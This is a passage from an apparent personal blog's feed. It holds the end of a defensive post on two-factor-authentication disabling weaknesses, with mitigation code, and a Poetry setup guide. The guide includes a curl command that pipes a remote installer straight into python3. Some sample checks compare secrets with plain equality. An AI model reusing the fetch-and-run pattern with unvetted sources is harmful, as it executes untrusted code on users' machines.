class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import secrets</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def generate_backup_code():</span><br><span class="line">    return &#x27;&#x27;.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))</span><br><span class="line"></span><br><span class="line">def validate_backup_code(user_id, input_code):</span><br><span class="line">    stored_code = get_user_backup_code(user_id)</span><br><span class="line">    if stored_code and input_code == stored_code:</span><br><span class="line">        invalidate_backup_code(user_id)</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure><hr><h4 id="3-Lack-of-Notification-Mechanism"><a href="#3-Lack-of-Notification-Mechanism" class="headerlink" title="3. Lack of Notification Mechanism"></a><strong>3. Lack of Notification Mechanism</strong></h4><p>If users are not notified when 2FA is disabled, attackers can disable 2FA without the user’s knowledge, leaving accounts exposed.</p><p><strong>Impact:</strong> The legitimate user remains unaware of the security breach.</p><p><strong>Mitigation:</strong></p><ul><li>Send real-time notifications (email, SMS, or push) to users whenever 2FA settings are modified.</li><li>Include information about the device, IP address, and timestamp in the notification.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def notify_user(user_id, action):</span><br><span class="line">    user_email = get_user_email(user_id)</span><br><span class="line">    send_email(</span><br><span class="line">        to=user_email,</span><br><span class="line">        subject=&quot;Security Alert: 2FA Disabled&quot;,</span><br><span class="line">        message=f&quot;Your 2FA was disabled at &#123;get_current_timestamp()&#125; from IP &#123;get_client_ip()&#125;.&quot;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><hr><h4 id="4-Sensitive-Operations-Lack-Additional-Verification"><a href="#4-Sensitive-Operations-Lack-Additional-Verification" class="headerlink" title="4. Sensitive Operations Lack Additional Verification"></a><strong>4. Sensitive Operations Lack Additional Verification</strong></h4><p>Systems often fail to require additional verification (e.g., password input) when disabling 2FA, making it easier for attackers to perform this action if they gain access to the account.</p><p><strong>Impact:</strong> Attackers can easily disable 2FA without the need for additional authentication.</p><p><strong>Mitigation:</strong></p><ul><li>Require users to re-enter their password or confirm their identity through another method (e.g., biometric authentication) before disabling 2FA.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def verify_password(user_id, input_password):</span><br><span class="line">    stored_hash = get_user_password_hash(user_id)</span><br><span class="line">    return check_password_hash(input_password, stored_hash)</span><br><span class="line"></span><br><span class="line">def disable_2fa_with_verification(user_id, input_password):</span><br><span class="line">    if verify_password(user_id, input_password):</span><br><span class="line">        perform_disable_2fa(user_id)</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;Password verification failed.&quot;)</span><br></pre></td></tr></table></figure><hr><h4 id="5-Session-Token-Not-Expired-After-2FA-Disabling"><a href="#5-Session-Token-Not-Expired-After-2FA-Disabling" class="headerlink" title="5. Session Token Not Expired After 2FA Disabling"></a><strong>5. Session Token Not Expired After 2FA Disabling</strong></h4><p>If session tokens are not invalidated after disabling 2FA, attackers can continue using the old session without triggering new authentication.</p><p><strong>Impact:</strong> Attackers with an active session can bypass any changes in authentication settings.</p><p><strong>Mitigation:</strong></p><ul><li>Revoke all active sessions after disabling 2FA.</li><li>Require the user to log in again with updated authentication settings.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def revoke_all_sessions(user_id):</span><br><span class="line">    # Remove all active sessions from the database</span><br><span class="line">    delete_sessions_for_user(user_id)</span><br><span class="line"></span><br><span class="line">def disable_2fa(user_id):</span><br><span class="line">    perform_disable_2fa(user_id)</span><br><span class="line">    revoke_all_sessions(user_id)</span><br></pre></td></tr></table></figure><hr><h4 id="6-CSRF-Vulnerabilities-in-2FA-Related-Actions"><a href="#6-CSRF-Vulnerabilities-in-2FA-Related-Actions" class="headerlink" title="6. CSRF Vulnerabilities in 2FA-Related Actions"></a><strong>6. CSRF Vulnerabilities in 2FA-Related Actions</strong></h4><p>Cross-Site Request Forgery (CSRF) vulnerabilities can allow attackers to trick authenticated users into disabling 2FA without their knowledge.</p><p><strong>Impact:</strong> Attackers can craft malicious links or forms to disable 2FA on behalf of the user.</p><p><strong>Mitigation:</strong></p><ul><li>Use CSRF tokens for all 2FA-related actions.</li><li>Validate the token server-side for each request.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def validate_csrf_token(input_token, session_token):</span><br><span class="line">    return input_token == session_token</span><br><span class="line"></span><br><span class="line">def disable_2fa(request, user_id):</span><br><span class="line">    csrf_token = request.get(&quot;csrf_token&quot;)</span><br><span class="line">    if not validate_csrf_token(csrf_token, get_session_csrf_token(user_id)):</span><br><span class="line">        raise Exception(&quot;CSRF token validation failed.&quot;)</span><br><span class="line">    perform_disable_2fa(user_id)</span><br></pre></td></tr></table></figure><hr><h4 id="7-Misuse-of-Developer-Debug-Modes"><a href="#7-Misuse-of-Developer-Debug-Modes" class="headerlink" title="7. Misuse of Developer Debug Modes"></a><strong>7. Misuse of Developer Debug Modes</strong></h4><p>In some cases, debug modes allow bypassing 2FA for testing purposes. If left enabled in production, attackers can exploit these debug features.</p><p><strong>Impact:</strong> Attackers can completely bypass 2FA protections.</p><p><strong>Mitigation:</strong></p><ul><li>Ensure debug modes are disabled in production builds.</li><li>Implement runtime checks to verify that debug flags are not present.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def ensure_debug_mode_disabled():</span><br><span class="line">    if is_debug_mode():</span><br><span class="line">        raise Exception(&quot;Debug mode is enabled in production!&quot;)</span><br><span class="line"></span><br><span class="line">def perform_sensitive_action():</span><br><span class="line">    ensure_debug_mode_disabled()</span><br><span class="line">    # Proceed with action</span><br></pre></td></tr></table></figure><hr><h4 id="8-Poorly-Configured-API-Permissions"><a href="#8-Poorly-Configured-API-Permissions" class="headerlink" title="8. Poorly Configured API Permissions"></a><strong>8. Poorly Configured API Permissions</strong></h4><p>APIs that allow 2FA disabling may not properly restrict access. Attackers can exploit misconfigured permissions to disable 2FA via APIs.</p><p><strong>Impact:</strong> Attackers can send unauthorized API requests to disable 2FA.</p><p><strong>Mitigation:</strong></p><ul><li>Implement strict authentication and authorization checks for API endpoints.</li><li>Require API requests to be signed and session-bound.</li></ul><p><strong>Code Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def disable_2fa_api(request, user_id):</span><br><span class="line">    api_token = request.headers.get(&quot;Authorization&quot;)</span><br><span class="line">    if not validate_api_token(api_token, user_id):</span><br><span class="line">        raise Exception(&quot;Invalid API token.&quot;)</span><br><span class="line">    perform_disable_2fa(user_id)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Description-of-2FA-Vulnerabilities&quot;&gt;&lt;a href=&quot;#Description-of-2FA-Vulnerabilities&quot; class=&quot;headerlink&quot; title=&quot;Description of 2FA Vulne</summary>
      
    
    
    
    
    <category term="vuls" scheme="http://iaaaannn0.com/tags/vuls/"/>
    
  </entry>
  
  <entry>
    <title>A Comprehensive Guide to Managing Python Projects with Poetry</title>
    <link href="http://iaaaannn0.com/2025/01/30/poetry/"/>
    <id>http://iaaaannn0.com/2025/01/30/poetry/</id>
    <published>2025-01-30T04:09:36.000Z</published>
    <updated>2025-01-30T04:37:45.432Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Poetry is a powerful dependency management and packaging tool for Python. It provides a seamless workflow for managing dependencies, creating virtual environments, and packaging applications. This guide will walk you through the essential features of Poetry, including how to generate a <code>requirements.txt</code> file for compatibility with <code>pip</code>.</p></blockquote><h2 id="1-Installing-Poetry"><strong>1. Installing Poetry</strong></h2><p>To install Poetry, run the following command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://install.python-poetry.org | python3 -</span><br></pre></td></tr></table></figure><p>After installation, ensure Poetry is available in your terminal by checking its version:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry --version</span><br></pre></td></tr></table></figure><p>If the command does not work, add Poetry to your PATH:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;$HOME/.local/bin:$PATH&quot;</span><br></pre></td></tr></table></figure><h2 id="2-Creating-a-New-Poetry-Project"><strong>2. Creating a New Poetry Project</strong></h2><p>To create a new Python project with Poetry, use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry new my_project</span><br></pre></td></tr></table></figure><p>This command sets up a basic Python package structure:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">my_project/</span><br><span class="line">├── pyproject.toml  # Configuration file for Poetry</span><br><span class="line">├── README.rst</span><br><span class="line">├── my_project/     # Project source code</span><br><span class="line">│   └── __init__.py</span><br><span class="line">└── tests/          # Test files</span><br></pre></td></tr></table></figure><p>If you already have a project and want to initialize Poetry within it, navigate to the project directory and run:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry init</span><br></pre></td></tr></table></figure><p>This will guide you through setting up <code>pyproject.toml</code> interactively.</p><h2 id="3-Managing-Dependencies"><strong>3. Managing Dependencies</strong></h2><h3 id="Adding-Dependencies"><strong>Adding Dependencies</strong></h3><p>To install a package and automatically update <code>pyproject.toml</code> and <code>poetry.lock</code>, use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry add requests</span><br></pre></td></tr></table></figure><p>For a development-only dependency:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry add --dev pytest</span><br></pre></td></tr></table></figure><h3 id="Removing-Dependencies"><strong>Removing Dependencies</strong></h3><p>To remove a package:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry remove requests</span><br></pre></td></tr></table></figure><h3 id="Updating-Dependencies"><strong>Updating Dependencies</strong></h3><p>To update all dependencies:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry update</span><br></pre></td></tr></table></figure><p>To update a specific package:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry update requests</span><br></pre></td></tr></table></figure><h2 id="4-Virtual-Environments-and-Running-Code"><strong>4. Virtual Environments and Running Code</strong></h2><p>Poetry automatically manages a virtual environment for your project. You can activate it with:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry shell</span><br></pre></td></tr></table></figure><p>To run a Python script within the virtual environment without activating the shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry run python script.py</span><br></pre></td></tr></table></figure><p>To check the virtual environment being used:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry env info</span><br></pre></td></tr></table></figure><h2 id="5-Exporting-Requirements-for-pip"><strong>5. Exporting Requirements for pip</strong></h2><p>Poetry does not use <code>requirements.txt</code> natively, but you can export dependencies for environments that require it (e.g., Docker, CI/CD pipelines).</p><h3 id="6-Install-the-Poetry-Export-Plugin">6. <strong>Install the Poetry Export Plugin</strong></h3><p>Poetry 2.0+ requires an additional plugin to export dependencies:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry self add poetry-plugin-export</span><br></pre></td></tr></table></figure><h3 id="7-Generate-requirements-txt">7. <strong>Generate</strong> <code>requirements.txt</code></h3><p>Run the following command to export dependencies:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry export -f requirements.txt --output requirements.txt --without-hashes</span><br></pre></td></tr></table></figure><p>If you need to include development dependencies:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry export -f requirements.txt --output requirements.txt --without-hashes --with dev</span><br></pre></td></tr></table></figure><p>You can then install these dependencies using pip:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="8-Version-Management"><strong>8. Version Management</strong></h2><p>To check the current project version:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry version</span><br></pre></td></tr></table></figure><p>To update the version:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poetry version patch  # Increases 1.0.0 -&gt; 1.0.1</span><br><span class="line">poetry version minor  # Increases 1.0.0 -&gt; 1.1.0</span><br><span class="line">poetry version major  # Increases 1.0.0 -&gt; 2.0.0</span><br></pre></td></tr></table></figure><h2 id="9-Publishing-to-PyPI"><strong>9. Publishing to PyPI</strong></h2><p>To publish your package to PyPI, first build it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry build</span><br></pre></td></tr></table></figure><p>Then publish it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry publish</span><br></pre></td></tr></table></figure><p>To publish to TestPyPI for testing:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poetry publish --repository testpypi</span><br></pre></td></tr></table></figure><h2 id="Conclusion"><strong>Conclusion</strong></h2><p>Poetry simplifies dependency management, virtual environments, and packaging for Python projects. By using Poetry, you can ensure a more reliable and consistent development workflow. With the ability to export <code>requirements.txt</code>, Poetry remains compatible with traditional Python workflows while providing a modern alternative to <code>pip</code> and <code>virtualenv</code>.</p><p>Start using Poetry today to streamline your Python project management! 🚀</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Poetry is a powerful dependency management and packaging tool for Python. It provides a seamless workflow for managing depen</summary>
      
    
    
    
    
    <category term="poetry" scheme="http://iaaaannn0.com/tags/poetry/"/>
    
  </entry>
  
</feed>
